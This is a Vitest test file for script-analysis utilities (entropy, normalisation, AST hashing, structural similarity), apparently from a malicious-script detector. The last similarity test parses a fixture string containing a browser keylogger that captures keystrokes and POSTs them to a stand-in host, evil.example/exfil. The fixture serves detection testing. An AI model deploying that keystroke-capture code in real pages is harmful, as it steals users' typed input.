import { describe, it, expect } from 'vitest';
import {
  calculateEntropy,
  normalizeScriptSource,
  computeASTHash,
  computeASTFeatureVector,
  computeSimilarity,
  parseToAST,
} from '../script-utils';

describe('script-utils', () => {
  describe('calculateEntropy', () => {
    it('returns 0 for empty string', () => {
      expect(calculateEntropy('')).toBe(0);
    });

    it('returns 0 for single repeated character (no uncertainty)', () => {
      expect(calculateEntropy('aaaaaaaa')).toBe(0);
    });

    it('returns 1 bit per char for uniform binary alphabet', () => {
      // Two equally frequent characters → exactly 1 bit entropy
      expect(calculateEntropy('abab')).toBeCloseTo(1, 10);
    });

    it('returns 2 bits per char for uniform 4-letter alphabet', () => {
      expect(calculateEntropy('abcd')).toBeCloseTo(2, 10);
    });

    it('returns ~4.5-5.5 bits for natural-looking text (normal JS range)', () => {
      const natural = 'function add(a, b) { return a + b; }';
      const entropy = calculateEntropy(natural);
      expect(entropy).toBeGreaterThan(3.5);
      expect(entropy).toBeLessThan(5.5);
    });

    it('returns higher entropy for random/obfuscated-looking strings', () => {
      // High-entropy string approximating obfuscated/encrypted content
      const obfuscated = 'Zx9!Qw3@Mn7#Kp1$Lv5%Bg2^Rs8&Tc4*Fy6(Hj0)';
      const entropy = calculateEntropy(obfuscated);
      expect(entropy).toBeGreaterThan(5.0);
    });

    it('is deterministic for the same input', () => {
      const input = 'some test string with various chars 123';
      expect(calculateEntropy(input)).toBe(calculateEntropy(input));
    });
  });

  describe('normalizeScriptSource', () => {
    it('strips single-line comments', () => {
      const src = 'const x = 1; // comment here\nconst y = 2;';
      const normalized = normalizeScriptSource(src);
      expect(normalized).not.toContain('comment here');
      expect(normalized).toContain('const x = 1');
      expect(normalized).toContain('const y = 2');
    });

    it('strips multi-line comments', () => {
      const src = 'const x = 1; /* this\nis a multi\nline comment */ const y = 2;';
      const normalized = normalizeScriptSource(src);
      expect(normalized).not.toContain('multi');
      expect(normalized).toContain('const x = 1');
      expect(normalized).toContain('const y = 2');
    });

    it('collapses whitespace runs into single spaces', () => {
      const src = 'const\t\tx   =\n\n\n1;';
      expect(normalizeScriptSource(src)).toBe('const x = 1;');
    });

    it('trims leading and trailing whitespace', () => {
      expect(normalizeScriptSource('   \n\tconst x = 1;\n\t  ')).toBe('const x = 1;');
    });

    it('produces identical output for differently-formatted equivalent code', () => {
      const a = 'const x = 1;\nconst y = 2;';
      const b = 'const x = 1;    const y = 2;';
      const c = 'const x = 1; // first\nconst y = 2; // second';
      expect(normalizeScriptSource(a)).toBe(normalizeScriptSource(b));
      expect(normalizeScriptSource(a)).toBe(normalizeScriptSource(c));
    });

    it('handles empty string', () => {
      expect(normalizeScriptSource('')).toBe('');
    });
  });

  describe('parseToAST', () => {
    it('parses valid JavaScript', () => {
      const ast = parseToAST('const x = 1 + 2;');
      expect(ast).not.toBeNull();
      expect(ast?.type).toBe('Program');
    });

    it('parses ES module syntax', () => {
      const ast = parseToAST('import { foo } from "bar"; export const x = 1;');
      expect(ast).not.toBeNull();
    });

    it('parses modern syntax (async/await, arrow fns, spread)', () => {
      const src = 'const fn = async (...args) => { return await Promise.resolve([...args]); };';
      const ast = parseToAST(src);
      expect(ast).not.toBeNull();
    });

    it('returns null on syntax errors', () => {
      expect(parseToAST('const x = ;;;;')).toBeNull();
      expect(parseToAST('function (')).toBeNull();
    });

    it('returns null for malformed input (does not throw)', () => {
      expect(() => parseToAST('}}}')).not.toThrow();
      expect(parseToAST('}}}')).toBeNull();
    });

    it('allows return outside function (script context)', () => {
      // Configured via allowReturnOutsideFunction for analysis of script fragments
      const ast = parseToAST('return 42;');
      expect(ast).not.toBeNull();
    });
  });

  describe('computeASTHash', () => {
    it('produces a 32-char hex string', () => {
      const ast = parseToAST('const x = 1;')!;
      const hash = computeASTHash(ast);
      expect(hash).toMatch(/^[0-9a-f]{32}$/);
    });

    it('is deterministic for the same AST', () => {
      const ast1 = parseToAST('function add(a, b) { return a + b; }')!;
      const ast2 = parseToAST('function add(a, b) { return a + b; }')!;
      expect(computeASTHash(ast1)).toBe(computeASTHash(ast2));
    });

    it('is resistant to variable-name obfuscation (structural hash)', () => {
      // Same structure, different identifiers → same hash
      const original = parseToAST('function add(a, b) { return a + b; }')!;
      const renamed = parseToAST('function xyz(p, q) { return p + q; }')!;
      expect(computeASTHash(original)).toBe(computeASTHash(renamed));
    });

    it('is resistant to whitespace and comment changes', () => {
      const a = parseToAST('const x=1;const y=2;')!;
      const b = parseToAST('const x = 1;\n// comment\nconst y = 2;')!;
      expect(computeASTHash(a)).toBe(computeASTHash(b));
    });

    it('produces different hashes for structurally different code', () => {
      const a = parseToAST('function add(a, b) { return a + b; }')!;
      const b = parseToAST('function add(a, b) { return a * b; }')!;
      expect(computeASTHash(a)).not.toBe(computeASTHash(b));
    });

    it('differentiates control-flow shape (if vs if-else)', () => {
      const ifOnly = parseToAST('if (x) { doThing(); }')!;
      const ifElse = parseToAST('if (x) { doThing(); } else { other(); }')!;
      expect(computeASTHash(ifOnly)).not.toBe(computeASTHash(ifElse));
    });

    it('differentiates function arity', () => {
      const oneArg = parseToAST('function f(a) { return a; }')!;
      const twoArgs = parseToAST('function f(a, b) { return a; }')!;
      expect(computeASTHash(oneArg)).not.toBe(computeASTHash(twoArgs));
    });

    it('differentiates async from sync functions', () => {
      const sync = parseToAST('function f() { return 1; }')!;
      const async = parseToAST('async function f() { return 1; }')!;
      expect(computeASTHash(sync)).not.toBe(computeASTHash(async));
    });
  });

  describe('computeASTFeatureVector', () => {
    it('returns a Map of feature counts', () => {
      const ast = parseToAST('const x = 1; const y = 2;')!;
      const vec = computeASTFeatureVector(ast);
      expect(vec).toBeInstanceOf(Map);
      expect(vec.size).toBeGreaterThan(0);
    });

    it('counts repeated structural features', () => {
      const ast = parseToAST('const a = 1; const b = 2; const c = 3;')!;
      const vec = computeASTFeatureVector(ast);
      // Three VariableDeclaration nodes should contribute to count
      const varDeclCount = vec.get('VariableDeclaration') ?? 0;
      expect(varDeclCount).toBeGreaterThanOrEqual(3);
    });

    it('is identical for structurally identical code with different names', () => {
      const ast1 = parseToAST('function add(a, b) { return a + b; }')!;
      const ast2 = parseToAST('function sub(x, y) { return x + y; }')!;
      const vec1 = computeASTFeatureVector(ast1);
      const vec2 = computeASTFeatureVector(ast2);
      expect(vec1.size).toBe(vec2.size);
      for (const [key, count] of vec1) {
        expect(vec2.get(key)).toBe(count);
      }
    });
  });

  describe('computeSimilarity', () => {
    it('returns 1 for identical vectors', () => {
      const vec = new Map([['A', 2], ['B', 3]]);
      expect(computeSimilarity(vec, vec)).toBeCloseTo(1, 10);
    });

    it('returns 1 for structurally identical code (different identifiers)', () => {
      const vec1 = computeASTFeatureVector(parseToAST('function f(a, b) { return a + b; }')!);
      const vec2 = computeASTFeatureVector(parseToAST('function g(x, y) { return x + y; }')!);
      expect(computeSimilarity(vec1, vec2)).toBeCloseTo(1, 10);
    });

    it('returns 0 when either vector is empty', () => {
      const empty = new Map<string, number>();
      const nonEmpty = new Map([['A', 1]]);
      expect(computeSimilarity(empty, nonEmpty)).toBe(0);
      expect(computeSimilarity(nonEmpty, empty)).toBe(0);
      expect(computeSimilarity(empty, empty)).toBe(0);
    });

    it('returns 0 for completely disjoint feature sets', () => {
      const a = new Map([['X', 1], ['Y', 1]]);
      const b = new Map([['P', 1], ['Q', 1]]);
      expect(computeSimilarity(a, b)).toBe(0);
    });

    it('returns a value between 0 and 1 for partial overlap', () => {
      const a = new Map([['A', 3], ['B', 1]]);
      const b = new Map([['A', 1], ['C', 2]]);
      const sim = computeSimilarity(a, b);
      expect(sim).toBeGreaterThan(0);
      expect(sim).toBeLessThan(1);
    });

    it('is symmetric: sim(a, b) === sim(b, a)', () => {
      const a = computeASTFeatureVector(parseToAST('const x = [1, 2, 3].map(i => i * 2);')!);
      const b = computeASTFeatureVector(parseToAST('function foo() { if (x) return y; }')!);
      expect(computeSimilarity(a, b)).toBeCloseTo(computeSimilarity(b, a), 10);
    });

    it('scores high (>0.85) for scripts with similar structure but different details', () => {
      const a = computeASTFeatureVector(
        parseToAST('function process(data) { const result = data.map(x => x * 2); return result; }')!
      );
      const b = computeASTFeatureVector(
        parseToAST('function transform(items) { const output = items.map(y => y * 3); return output; }')!
      );
      // Same shape: function with .map callback and return → should be very similar
      expect(computeSimilarity(a, b)).toBeGreaterThan(0.85);
    });

    it('scores low for fundamentally different programs', () => {
      const simple = computeASTFeatureVector(parseToAST('const x = 1;')!);
      const complex = computeASTFeatureVector(
        parseToAST(`
          class Keylogger {
            constructor() { this.buffer = []; }
            async install() {
              document.addEventListener('keydown', async (e) => {
                this.buffer.push(e.key);
                if (this.buffer.length > 100) {
                  await fetch('https://evil.example/exfil', { method: 'POST', body: JSON.stringify(this.buffer) });
                  this.buffer = [];
                }
              });
            }
          }
          new Keylogger().install();
        `)!
      );
      expect(computeSimilarity(simple, complex)).toBeLessThan(0.5);
    });
  });
});
